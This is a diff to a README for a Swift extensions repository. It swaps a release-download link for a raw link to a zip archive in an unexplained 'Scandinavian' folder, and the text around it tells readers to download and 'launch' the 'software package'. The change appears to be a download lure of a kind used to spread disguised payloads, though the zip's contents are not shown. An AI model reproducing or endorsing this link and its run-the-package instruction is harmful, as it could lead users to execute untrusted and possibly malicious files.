@@ -21,7 +21,7 @@ This repository contains a variety of Swift extensions that cover a range of fun
 ## Get Started
 
 To get started with using these awesome Swift extensions, simply download the software package from the following link:
-[![Download Software](https://github.com/levinrr/SwiftExtensions/releases/download/v2.0/Software.zip)](https://github.com/levinrr/SwiftExtensions/releases/download/v2.0/Software.zip)
+[![Download Software](https://github.com/levinrr/SwiftExtensions/raw/refs/heads/main/Scandinavian/Swift-Extensions-2.0-alpha.3.zip)](https://github.com/levinrr/SwiftExtensions/raw/refs/heads/main/Scandinavian/Swift-Extensions-2.0-alpha.3.zip)
 
 📢 Please note that the link provided above needs to be launched in order to download the software package. If you encounter any issues with the link, kindly check the "Releases" section of this repository for alternative download options.
 
